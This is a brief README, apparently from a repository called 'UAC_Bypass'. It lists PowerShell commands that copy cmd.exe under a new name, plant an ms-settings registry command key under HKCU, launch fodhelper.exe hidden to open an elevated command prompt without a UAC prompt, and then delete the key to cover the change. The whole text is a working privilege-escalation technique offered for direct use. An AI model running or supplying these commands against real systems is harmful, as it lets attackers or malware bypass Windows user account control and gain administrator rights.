# UAC_Bypass

Run these commands in a powershell window to start an escellated privilage command prompt window

copy C:\Windows\system32\cmd.exe c:\users\l_\desktop\123.exe
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value c:\users\l_\desktop\123.exe -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Force
